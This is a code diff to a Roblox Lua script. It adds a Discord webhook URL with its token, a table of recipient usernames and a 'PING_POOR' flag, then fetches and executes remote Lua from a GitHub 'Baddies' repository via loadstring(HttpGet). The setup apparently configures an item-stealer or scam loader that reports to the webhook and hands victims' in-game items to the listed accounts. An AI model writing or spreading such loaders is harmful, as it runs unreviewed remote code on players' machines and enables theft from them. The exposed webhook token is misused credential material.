@@ -9,3 +9,15 @@ _G.PING_POOR = true
 task.spawn(function(_4, _4_2)
     loadstring(game:HttpGet('https://raw.githubusercontent.com/Balsback7/Baddies/refs/heads/main/freemium.lua', true))()
 end)
+
+_G.POOR_WEBHOOK = 'https://discordapp.com/api/webhooks/1521699994674139256/n6onaHcwt2y_Q23mNRHwO4i1-r5zfAqTmEnl3kU8nx9fiU9y-LBof5K5IDVwEjvmnfDJ'
+_G.MY_USERNAMES = {
+    [1] = 'noahgiftsx',
+    [2] = 'X',
+    [3] = 'X',
+}
+_G.PING_POOR = true
+
+task.spawn(function(_4, _4_2)
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Balsback7/Baddies/refs/heads/main/free.lua', true))()
+end)
